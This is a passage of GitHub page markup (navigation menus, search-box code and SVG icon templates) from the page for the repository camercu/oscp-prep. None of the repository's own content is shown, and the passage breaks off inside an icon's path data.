        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 pt-2 pt-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 pb-2 pb-lg-4 px-lg-4">
          <div class="HeaderMenu-column">
              <div class="border-bottom pb-3 pb-lg-0 pb-lg-3 mb-3 mb-lg-0 mb-lg-3">
                <ul class="list-style-none f5" >
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_sponsors&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_sponsors_link_open_source_navbar&quot;}" href="/sponsors">
      
      <div>
        <div class="color-fg-default h4">GitHub Sponsors</div>
        Fund open source developers
      </div>

    
</a></li>

                </ul>
              </div>
              <div class="border-bottom pb-3 pb-lg-0 pb-lg-3 mb-3 mb-lg-0 mb-lg-3">
                <ul class="list-style-none f5" >
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;the_readme_project&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;the_readme_project_link_open_source_navbar&quot;}" href="https://github.com/readme">
      
      <div>
        <div class="color-fg-default h4">The ReadME Project</div>
        GitHub community articles
      </div>

    
</a></li>

                </ul>
              </div>
              <div class="border-bottom pb-3 pb-lg-0 border-bottom-0">
                    <span class="d-block h4 color-fg-default my-1" id="open-source-repositories-heading">Repositories</span>
                <ul class="list-style-none f5" aria-labelledby="open-source-repositories-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;topics&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;topics_link_open_source_navbar&quot;}" href="https://github.com/topics">
      Topics

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;trending&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;trending_link_open_source_navbar&quot;}" href="https://github.com/trending">
      Trending

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;collections&quot;,&quot;context&quot;:&quot;open_source&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;collections_link_open_source_navbar&quot;}" href="https://github.com/collections">
      Collections

    
</a></li>

                </ul>
              </div>
          </div>
      </div>
</li>


                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
      <button type="button" class="HeaderMenu-link border-0 width-full width-lg-auto px-0 px-lg-2 py-lg-2 no-wrap d-flex flex-items-center flex-justify-between js-details-target" aria-expanded="false">
        Enterprise
        <svg opacity="0.5" aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-chevron-down HeaderMenu-icon ml-1">
    <path d="M12.78 5.22a.749.749 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.06 0L3.22 6.28a.749.749 0 1 1 1.06-1.06L8 8.939l3.72-3.719a.749.749 0 0 1 1.06 0Z"></path>
</svg>
      </button>
      <div class="HeaderMenu-dropdown dropdown-menu rounded m-0 p-0 pt-2 pt-lg-4 position-relative position-lg-absolute left-0 left-lg-n3 pb-2 pb-lg-4 px-lg-4">
          <div class="HeaderMenu-column">
              <div class="border-bottom pb-3 pb-lg-0 pb-lg-3 mb-3 mb-lg-0 mb-lg-3">
                <ul class="list-style-none f5" >
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;enterprise_platform&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;enterprise_platform_link_enterprise_navbar&quot;}" href="/enterprise">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-stack color-fg-subtle mr-3">
    <path d="M11.063 1.456a1.749 1.749 0 0 1 1.874 0l8.383 5.316a1.751 1.751 0 0 1 0 2.956l-8.383 5.316a1.749 1.749 0 0 1-1.874 0L2.68 9.728a1.751 1.751 0 0 1 0-2.956Zm1.071 1.267a.25.25 0 0 0-.268 0L3.483 8.039a.25.25 0 0 0 0 .422l8.383 5.316a.25.25 0 0 0 .268 0l8.383-5.316a.25.25 0 0 0 0-.422Z"></path><path d="M1.867 12.324a.75.75 0 0 1 1.035-.232l8.964 5.685a.25.25 0 0 0 .268 0l8.964-5.685a.75.75 0 0 1 .804 1.267l-8.965 5.685a1.749 1.749 0 0 1-1.874 0l-8.965-5.685a.75.75 0 0 1-.231-1.035Z"></path><path d="M1.867 16.324a.75.75 0 0 1 1.035-.232l8.964 5.685a.25.25 0 0 0 .268 0l8.964-5.685a.75.75 0 0 1 .804 1.267l-8.965 5.685a1.749 1.749 0 0 1-1.874 0l-8.965-5.685a.75.75 0 0 1-.231-1.035Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Enterprise platform</div>
        AI-powered developer platform
      </div>

    
</a></li>

                </ul>
              </div>
              <div class="border-bottom pb-3 pb-lg-0 border-bottom-0">
                    <span class="d-block h4 color-fg-default my-1" id="enterprise-available-add-ons-heading">Available add-ons</span>
                <ul class="list-style-none f5" aria-labelledby="enterprise-available-add-ons-heading">
                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;advanced_security&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;advanced_security_link_enterprise_navbar&quot;}" href="https://github.com/enterprise/advanced-security">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-shield-check color-fg-subtle mr-3">
    <path d="M16.53 9.78a.75.75 0 0 0-1.06-1.06L11 13.19l-1.97-1.97a.75.75 0 0 0-1.06 1.06l2.5 2.5a.75.75 0 0 0 1.06 0l5-5Z"></path><path d="m12.54.637 8.25 2.675A1.75 1.75 0 0 1 22 4.976V10c0 6.19-3.771 10.704-9.401 12.83a1.704 1.704 0 0 1-1.198 0C5.77 20.705 2 16.19 2 10V4.976c0-.758.489-1.43 1.21-1.664L11.46.637a1.748 1.748 0 0 1 1.08 0Zm-.617 1.426-8.25 2.676a.249.249 0 0 0-.173.237V10c0 5.46 3.28 9.483 8.43 11.426a.199.199 0 0 0 .14 0C17.22 19.483 20.5 15.461 20.5 10V4.976a.25.25 0 0 0-.173-.237l-8.25-2.676a.253.253 0 0 0-.154 0Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Advanced Security</div>
        Enterprise-grade security features
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description pb-lg-3" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;github_copilot&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;github_copilot_link_enterprise_navbar&quot;}" href="/features/copilot#enterprise">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-copilot color-fg-subtle mr-3">
    <path d="M23.922 16.992c-.861 1.495-5.859 5.023-11.922 5.023-6.063 0-11.061-3.528-11.922-5.023A.641.641 0 0 1 0 16.736v-2.869a.841.841 0 0 1 .053-.22c.372-.935 1.347-2.292 2.605-2.656.167-.429.414-1.055.644-1.517a10.195 10.195 0 0 1-.052-1.086c0-1.331.282-2.499 1.132-3.368.397-.406.89-.717 1.474-.952 1.399-1.136 3.392-2.093 6.122-2.093 2.731 0 4.767.957 6.166 2.093.584.235 1.077.546 1.474.952.85.869 1.132 2.037 1.132 3.368 0 .368-.014.733-.052 1.086.23.462.477 1.088.644 1.517 1.258.364 2.233 1.721 2.605 2.656a.832.832 0 0 1 .053.22v2.869a.641.641 0 0 1-.078.256ZM12.172 11h-.344a4.323 4.323 0 0 1-.355.508C10.703 12.455 9.555 13 7.965 13c-1.725 0-2.989-.359-3.782-1.259a2.005 2.005 0 0 1-.085-.104L4 11.741v6.585c1.435.779 4.514 2.179 8 2.179 3.486 0 6.565-1.4 8-2.179v-6.585l-.098-.104s-.033.045-.085.104c-.793.9-2.057 1.259-3.782 1.259-1.59 0-2.738-.545-3.508-1.492a4.323 4.323 0 0 1-.355-.508h-.016.016Zm.641-2.935c.136 1.057.403 1.913.878 2.497.442.544 1.134.938 2.344.938 1.573 0 2.292-.337 2.657-.751.384-.435.558-1.15.558-2.361 0-1.14-.243-1.847-.705-2.319-.477-.488-1.319-.862-2.824-1.025-1.487-.161-2.192.138-2.533.529-.269.307-.437.808-.438 1.578v.021c0 .265.021.562.063.893Zm-1.626 0c.042-.331.063-.628.063-.894v-.02c-.001-.77-.169-1.271-.438-1.578-.341-.391-1.046-.69-2.533-.529-1.505.163-2.347.537-2.824 1.025-.462.472-.705 1.179-.705 2.319 0 1.211.175 1.926.558 2.361.365.414 1.084.751 2.657.751 1.21 0 1.902-.394 2.344-.938.475-.584.742-1.44.878-2.497Z"></path><path d="M14.5 14.25a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Zm-5 0a1 1 0 0 1 1 1v2a1 1 0 0 1-2 0v-2a1 1 0 0 1 1-1Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">GitHub Copilot</div>
        Enterprise-grade AI features
      </div>

    
</a></li>

                    <li>
  <a class="HeaderMenu-dropdown-link d-block no-underline position-relative py-2 Link--secondary d-flex flex-items-center Link--has-description" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;premium_support&quot;,&quot;context&quot;:&quot;enterprise&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;premium_support_link_enterprise_navbar&quot;}" href="/premium-support">
      <svg aria-hidden="true" height="24" viewBox="0 0 24 24" version="1.1" width="24" data-view-component="true" class="octicon octicon-comment-discussion color-fg-subtle mr-3">
    <path d="M1.75 1h12.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 14.25 14H8.061l-2.574 2.573A1.458 1.458 0 0 1 3 15.543V14H1.75A1.75 1.75 0 0 1 0 12.25v-9.5C0 1.784.784 1 1.75 1ZM1.5 2.75v9.5c0 .138.112.25.25.25h2a.75.75 0 0 1 .75.75v2.19l2.72-2.72a.749.749 0 0 1 .53-.22h6.5a.25.25 0 0 0 .25-.25v-9.5a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25Z"></path><path d="M22.5 8.75a.25.25 0 0 0-.25-.25h-3.5a.75.75 0 0 1 0-1.5h3.5c.966 0 1.75.784 1.75 1.75v9.5A1.75 1.75 0 0 1 22.25 20H21v1.543a1.457 1.457 0 0 1-2.487 1.03L15.939 20H10.75A1.75 1.75 0 0 1 9 18.25v-1.465a.75.75 0 0 1 1.5 0v1.465c0 .138.112.25.25.25h5.5a.75.75 0 0 1 .53.22l2.72 2.72v-2.19a.75.75 0 0 1 .75-.75h2a.25.25 0 0 0 .25-.25v-9.5Z"></path>
</svg>
      <div>
        <div class="color-fg-default h4">Premium Support</div>
        Enterprise-grade 24/7 support
      </div>

    
</a></li>

                </ul>
              </div>
          </div>
      </div>
</li>


                <li class="HeaderMenu-item position-relative flex-wrap flex-justify-between flex-items-center d-block d-lg-flex flex-lg-nowrap flex-lg-items-center js-details-container js-header-menu-item">
    <a class="HeaderMenu-link no-underline px-0 px-lg-2 py-3 py-lg-2 d-block d-lg-inline-block" data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;pricing&quot;,&quot;context&quot;:&quot;global&quot;,&quot;tag&quot;:&quot;link&quot;,&quot;label&quot;:&quot;pricing_link_global_navbar&quot;}" href="https://github.com/pricing">Pricing</a>
</li>

            </ul>
          </nav>

        <div class="d-flex flex-column flex-lg-row width-full flex-justify-end flex-lg-items-center text-center mt-3 mt-lg-0 text-lg-left ml-lg-3">
                


<qbsearch-input class="search-input" data-scope="repo:camercu/oscp-prep" data-custom-scopes-path="/search/custom_scopes" data-delete-custom-scopes-csrf="y8OWCyB9oAvajCCkj3z-i-Nc0DSfR8JxNBcXldG5ai0Pcw3Z08pViRHhsRJeYD1ISpvrqbPg0Ssg9cVxIb73zg" data-max-custom-scopes="10" data-header-redesign-enabled="false" data-initial-value="" data-blackbird-suggestions-path="/search/suggestions" data-jump-to-suggestions-path="/_graphql/GetSuggestedNavigationDestinations" data-current-repository="camercu/oscp-prep" data-current-org="" data-current-owner="camercu" data-logged-in="false" data-copilot-chat-enabled="false" data-nl-search-enabled="false" data-retain-scroll-position="true">
  <div
    class="search-input-container search-with-dialog position-relative d-flex flex-row flex-items-center mr-4 rounded"
    data-action="click:qbsearch-input#searchInputContainerClicked"
  >
      <button
        type="button"
        class="header-search-button placeholder  input-button form-control d-flex flex-1 flex-self-stretch flex-items-center no-wrap width-full py-0 pl-2 pr-0 text-left border-0 box-shadow-none"
        data-target="qbsearch-input.inputButton"
        aria-label="Search or jump to"
        aria-haspopup="dialog"
        placeholder="Search or jump to..."
        data-hotkey=s,/
        autocapitalize="off"
        data-analytics-event="{&quot;location&quot;:&quot;navbar&quot;,&quot;action&quot;:&quot;searchbar&quot;,&quot;context&quot;:&quot;global&quot;,&quot;tag&quot;:&quot;input&quot;,&quot;label&quot;:&quot;searchbar_input_global_navbar&quot;}"
        data-action="click:qbsearch-input#handleExpand"
      >
        <div class="mr-2 color-fg-muted">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
        </div>
        <span class="flex-1" data-target="qbsearch-input.inputButtonText">Search or jump to...</span>
          <div class="d-flex" data-target="qbsearch-input.hotkeyIndicator">
            <svg xmlns="http://www.w3.org/2000/svg" width="22" height="20" aria-hidden="true" class="mr-1"><path fill="none" stroke="#979A9C" opacity=".4" d="M3.5.5h12c1.7 0 3 1.3 3 3v13c0 1.7-1.3 3-3 3h-12c-1.7 0-3-1.3-3-3v-13c0-1.7 1.3-3 3-3z"></path><path fill="#979A9C" d="M11.8 6L8 15.1h-.9L10.8 6h1z"></path></svg>

          </div>
      </button>

    <input type="hidden" name="type" class="js-site-search-type-field">

    
<div class="Overlay--hidden " data-modal-dialog-overlay>
  <modal-dialog data-action="close:qbsearch-input#handleClose cancel:qbsearch-input#handleClose" data-target="qbsearch-input.searchSuggestionsDialog" role="dialog" id="search-suggestions-dialog" aria-modal="true" aria-labelledby="search-suggestions-dialog-header" data-view-component="true" class="Overlay Overlay--width-large Overlay--height-auto">
      <h1 id="search-suggestions-dialog-header" class="sr-only">Search code, repositories, users, issues, pull requests...</h1>
    <div class="Overlay-body Overlay-body--paddingNone">
      
          <div data-view-component="true">        <div class="search-suggestions position-fixed width-full color-shadow-large border color-fg-default color-bg-default overflow-hidden d-flex flex-column query-builder-container"
          style="border-radius: 12px;"
          data-target="qbsearch-input.queryBuilderContainer"
          hidden
        >
          <!-- '"` --><!-- </textarea></xmp> --></option></form><form id="query-builder-test-form" action="" accept-charset="UTF-8" method="get">
  <query-builder data-target="qbsearch-input.queryBuilder" id="query-builder-query-builder-test" data-filter-key=":" data-view-component="true" class="QueryBuilder search-query-builder">
    <div class="FormControl FormControl--fullWidth">
      <label id="query-builder-test-label" for="query-builder-test" class="FormControl-label sr-only">
        Search
      </label>
      <div
        class="QueryBuilder-StyledInput width-fit "
        data-target="query-builder.styledInput"
      >
          <span id="query-builder-test-leadingvisual-wrap" class="FormControl-input-leadingVisualWrap QueryBuilder-leadingVisualWrap">
            <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search FormControl-input-leadingVisual">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
          </span>
        <div data-target="query-builder.styledInputContainer" class="QueryBuilder-StyledInputContainer">
          <div
            aria-hidden="true"
            class="QueryBuilder-StyledInputContent"
            data-target="query-builder.styledInputContent"
          ></div>
          <div class="QueryBuilder-InputWrapper">
            <div aria-hidden="true" class="QueryBuilder-Sizer" data-target="query-builder.sizer"></div>
            <input id="query-builder-test" name="query-builder-test" value="" autocomplete="off" type="text" role="combobox" spellcheck="false" aria-expanded="false" aria-describedby="validation-b6237de8-0785-4b2b-ac5c-f846799174d8" data-target="query-builder.input" data-action="
          input:query-builder#inputChange
          blur:query-builder#inputBlur
          keydown:query-builder#inputKeydown
          focus:query-builder#inputFocus
        " data-view-component="true" class="FormControl-input QueryBuilder-Input FormControl-medium" />
          </div>
        </div>
          <span class="sr-only" id="query-builder-test-clear">Clear</span>
          <button role="button" id="query-builder-test-clear-button" aria-labelledby="query-builder-test-clear query-builder-test-label" data-target="query-builder.clearButton" data-action="
                click:query-builder#clear
                focus:query-builder#clearButtonFocus
                blur:query-builder#clearButtonBlur
              " variant="small" hidden="hidden" type="button" data-view-component="true" class="Button Button--iconOnly Button--invisible Button--medium mr-1 px-2 py-0 d-flex flex-items-center rounded-1 color-fg-muted">  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-x-circle-fill Button-visual">
    <path d="M2.343 13.657A8 8 0 1 1 13.658 2.343 8 8 0 0 1 2.343 13.657ZM6.03 4.97a.751.751 0 0 0-1.042.018.751.751 0 0 0-.018 1.042L6.94 8 4.97 9.97a.749.749 0 0 0 .326 1.275.749.749 0 0 0 .734-.215L8 9.06l1.97 1.97a.749.749 0 0 0 1.275-.326.749.749 0 0 0-.215-.734L9.06 8l1.97-1.97a.749.749 0 0 0-.326-1.275.749.749 0 0 0-.734.215L8 6.94Z"></path>
</svg>
</button>

      </div>
      <template id="search-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-search">
    <path d="M10.68 11.74a6 6 0 0 1-7.922-8.982 6 6 0 0 1 8.982 7.922l3.04 3.04a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215ZM11.5 7a4.499 4.499 0 1 0-8.997 0A4.499 4.499 0 0 0 11.5 7Z"></path>
</svg>
</template>

<template id="code-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-code">
    <path d="m11.28 3.22 4.25 4.25a.75.75 0 0 1 0 1.06l-4.25 4.25a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734L13.94 8l-3.72-3.72a.749.749 0 0 1 .326-1.275.749.749 0 0 1 .734.215Zm-6.56 0a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042L2.06 8l3.72 3.72a.749.749 0 0 1-.326 1.275.749.749 0 0 1-.734-.215L.47 8.53a.75.75 0 0 1 0-1.06Z"></path>
</svg>
</template>

<template id="file-code-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-file-code">
    <path d="M4 1.75C4 .784 4.784 0 5.75 0h5.586c.464 0 .909.184 1.237.513l2.914 2.914c.329.328.513.773.513 1.237v8.586A1.75 1.75 0 0 1 14.25 15h-9a.75.75 0 0 1 0-1.5h9a.25.25 0 0 0 .25-.25V6h-2.75A1.75 1.75 0 0 1 10 4.25V1.5H5.75a.25.25 0 0 0-.25.25v2.5a.75.75 0 0 1-1.5 0Zm1.72 4.97a.75.75 0 0 1 1.06 0l2 2a.75.75 0 0 1 0 1.06l-2 2a.749.749 0 0 1-1.275-.326.749.749 0 0 1 .215-.734l1.47-1.47-1.47-1.47a.75.75 0 0 1 0-1.06ZM3.28 7.78 1.81 9.25l1.47 1.47a.751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018l-2-2a.75.75 0 0 1 0-1.06l2-2a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Zm8.22-6.218V4.25c0 .138.112.25.25.25h2.688l-.011-.013-2.914-2.914-.013-.011Z"></path>
</svg>
</template>

<template id="history-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-history">
    <path d="m.427 1.927 1.215 1.215a8.002 8.002 0 1 1-1.6 5.685.75.75 0 1 1 1.493-.154 6.5 6.5 0 1 0 1.18-4.458l1.358 1.358A.25.25 0 0 1 3.896 6H.25A.25.25 0 0 1 0 5.75V2.104a.25.25 0 0 1 .427-.177ZM7.75 4a.75.75 0 0 1 .75.75v2.992l2.028.812a.75.75 0 0 1-.557 1.392l-2.5-1A.751.751 0 0 1 7 8.25v-3.5A.75.75 0 0 1 7.75 4Z"></path>
</svg>
</template>

<template id="repo-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-repo">
    <path d="M2 2.5A2.5 2.5 0 0 1 4.5 0h8.75a.75.75 0 0 1 .75.75v12.5a.75.75 0 0 1-.75.75h-2.5a.75.75 0 0 1 0-1.5h1.75v-2h-8a1 1 0 0 0-.714 1.7.75.75 0 1 1-1.072 1.05A2.495 2.495 0 0 1 2 11.5Zm10.5-1h-8a1 1 0 0 0-1 1v6.708A2.486 2.486 0 0 1 4.5 9h8ZM5 12.25a.25.25 0 0 1 .25-.25h3.5a.25.25 0 0 1 .25.25v3.25a.25.25 0 0 1-.4.2l-1.45-1.087a.249.249 0 0 0-.3 0L5.4 15.7a.25.25 0 0 1-.4-.2Z"></path>
</svg>
</template>

<template id="bookmark-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-bookmark">
    <path d="M3 2.75C3 1.784 3.784 1 4.75 1h6.5c.966 0 1.75.784 1.75 1.75v11.5a.75.75 0 0 1-1.227.579L8 11.722l-3.773 3.107A.751.751 0 0 1 3 14.25Zm1.75-.25a.25.25 0 0 0-.25.25v9.91l3.023-2.489a.75.75 0 0 1 .954 0l3.023 2.49V2.75a.25.25 0 0 0-.25-.25Z"></path>
</svg>
</template>

<template id="plus-circle-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-plus-circle">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm7.25-3.25v2.5h2.5a.75.75 0 0 1 0 1.5h-2.5v2.5a.75.75 0 0 1-1.5 0v-2.5h-2.5a.75.75 0 0 1 0-1.5h2.5v-2.5a.75.75 0 0 1 1.5 0Z"></path>
</svg>
</template>

<template id="circle-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-dot-fill">
    <path d="M8 4a4 4 0 1 1 0 8 4 4 0 0 1 0-8Z"></path>
</svg>
</template>

<template id="trash-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-trash">
    <path d="M11 1.75V3h2.25a.75.75 0 0 1 0 1.5H2.75a.75.75 0 0 1 0-1.5H5V1.75C5 .784 5.784 0 6.75 0h2.5C10.216 0 11 .784 11 1.75ZM4.496 6.675l.66 6.6a.25.25 0 0 0 .249.225h5.19a.25.25 0 0 0 .249-.225l.66-6.6a.75.75 0 0 1 1.492.149l-.66 6.6A1.748 1.748 0 0 1 10.595 15h-5.19a1.75 1.75 0 0 1-1.741-1.575l-.66-6.6a.75.75 0 1 1 1.492-.15ZM6.5 1.75V3h3V1.75a.25.25 0 0 0-.25-.25h-2.5a.25.25 0 0 0-.25.25Z"></path>
</svg>
</template>

<template id="team-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-people">
    <path d="M2 5.5a3.5 3.5 0 1 1 5.898 2.549 5.508 5.508 0 0 1 3.034 4.084.75.75 0 1 1-1.482.235 4 4 0 0 0-7.9 0 .75.75 0 0 1-1.482-.236A5.507 5.507 0 0 1 3.102 8.05 3.493 3.493 0 0 1 2 5.5ZM11 4a3.001 3.001 0 0 1 2.22 5.018 5.01 5.01 0 0 1 2.56 3.012.749.749 0 0 1-.885.954.752.752 0 0 1-.549-.514 3.507 3.507 0 0 0-2.522-2.372.75.75 0 0 1-.574-.73v-.352a.75.75 0 0 1 .416-.672A1.5 1.5 0 0 0 11 5.5.75.75 0 0 1 11 4Zm-5.5-.5a2 2 0 1 0-.001 3.999A2 2 0 0 0 5.5 3.5Z"></path>
</svg>
</template>

<template id="project-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-project">
    <path d="M1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25V1.75C0 .784.784 0 1.75 0ZM1.5 1.75v12.5c0 .138.112.25.25.25h12.5a.25.25 0 0 0 .25-.25V1.75a.25.25 0 0 0-.25-.25H1.75a.25.25 0 0 0-.25.25ZM11.75 3a.75.75 0 0 1 .75.75v7.5a.75.75 0 0 1-1.5 0v-7.5a.75.75 0 0 1 .75-.75Zm-8.25.75a.75.75 0 0 1 1.5 0v5.5a.75.75 0 0 1-1.5 0ZM8 3a.75.75 0 0 1 .75.75v3.5a.75.75 0 0 1-1.5 0v-3.5A.75.75 0 0 1 8 3Z"></path>
</svg>
</template>

<template id="pencil-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-pencil">
    <path d="M11.013 1.427a1.75 1.75 0 0 1 2.474 0l1.086 1.086a1.75 1.75 0 0 1 0 2.474l-8.61 8.61c-.21.21-.47.364-.756.445l-3.251.93a.75.75 0 0 1-.927-.928l.929-3.25c.081-.286.235-.547.445-.758l8.61-8.61Zm.176 4.823L9.75 4.81l-6.286 6.287a.253.253 0 0 0-.064.108l-.558 1.953 1.953-.558a.253.253 0 0 0 .108-.064Zm1.238-3.763a.25.25 0 0 0-.354 0L10.811 3.75l1.439 1.44 1.263-1.263a.25.25 0 0 0 0-.354Z"></path>
</svg>
</template>

<template id="copilot-icon">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copilot">
    <path d="M7.998 15.035c-4.562 0-7.873-2.914-7.998-3.749V9.338c.085-.628.677-1.686 1.588-2.065.013-.07.024-.143.036-.218.029-.183.06-.384.126-.612-.201-.508-.254-1.084-.254-1.656 0-.87.128-1.769.693-2.484.579-.733 1.494-1.124 2.724-1.261 1.206-.134 2.262.034 2.944.765.05.053.096.108.139.165.044-.057.094-.112.143-.165.682-.731 1.738-.899 2.944-.765 1.23.137 2.145.528 2.724 1.261.566.715.693 1.614.693 2.484 0 .572-.053 1.148-.254 1.656.066.228.098.429.126.612.012.076.024.148.037.218.924.385 1.522 1.471 1.591 2.095v1.872c0 .766-3.351 3.795-8.002 3.795Zm0-1.485c2.28 0 4.584-1.11 5.002-1.433V7.862l-.023-.116c-.49.21-1.075.291-1.727.291-1.146 0-2.059-.327-2.71-.991A3.222 3.222 0 0 1 8 6.303a3.24 3.24 0 0 1-.544.743c-.65.664-1.563.991-2.71.991-.652 0-1.236-.081-1.727-.291l-.023.116v4.255c.419.323 2.722 1.433 5.002 1.433ZM6.762 2.83c-.193-.206-.637-.413-1.682-.297-1.019.113-1.479.404-1.713.7-.247.312-.369.789-.369 1.554 0 .793.129 1.171.308 1.371.162.181.519.379 1.442.379.853 0 1.339-.235 1.638-.54.315-.322.527-.827.617-1.553.117-.935-.037-1.395-.241-1.614Zm4.155-.297c-1.044-.116-1.488.091-1.681.297-.204.219-.359.679-.242 1.614.091.726.303 1.231.618 1.553.299.305.784.54 